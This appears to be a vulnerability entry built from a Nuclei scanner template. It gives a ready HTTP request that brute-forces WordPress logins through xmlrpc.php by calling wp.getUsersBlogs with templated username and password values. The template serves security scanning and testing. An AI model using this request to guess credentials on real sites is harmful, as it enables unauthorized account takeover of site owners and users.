# Vulnerability: Wordpress XMLRPC.php username and password Bruteforcer
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-xmlrpc-brute-force.yaml`)

## Description
This template bruteforces username and passwords through xmlrpc.php being available.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /xmlrpc.php HTTP/1.1
Host: {{Hostname}}
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
 <methodCall>
   <methodName>wp.getUsersBlogs</methodName>
   <params>
     <param>
       <value>{{username}}</value>
     </param>
       <param>
     <value>{{password}}</value>
       </param>
   </params>
 </methodCall>
```

